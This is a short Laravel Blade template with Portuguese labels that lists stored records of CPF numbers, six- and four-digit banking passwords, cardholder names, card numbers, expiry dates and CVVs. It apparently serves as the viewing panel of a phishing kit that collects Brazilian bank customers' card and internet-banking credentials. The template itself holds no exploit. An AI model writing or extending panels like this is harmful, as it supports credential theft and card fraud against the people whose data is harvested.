@extends('layout')

@section('cabecalho')
Infos 
@endsection

@section('conteudo')
        <a href="{{ route ('create_info')}}" class="btn btn-dark mb-2"> Adicionar Info</a>
        <ul class="list-group">
            <?php foreach ($infos as $info): ?>
            <li class="list-group-item">
                {{-- {{ $info->nome}} - <tr> --}}
               <i>CPF: {{ $info->cpf}}</i> / 
               <i>SENHA6: {{ $info->senha}} / 
                <i>NOME:  {{ $info->nome_cartao}} / 
                <i>CARD:  {{ $info->numero_cartao}} / 
                <i>VALIDADE:  {{ $info->validade_cartao}} / 
                <i>CVV:  {{ $info->cvv_cartao}} / 
                <i>SENHA4:  {{ $info->pass_internet_banking}}/
                <i>INFO:  {{ $info->created_at}}
               
            </li>
            
            <?php endforeach; ?>
        </ul>
        @endsection
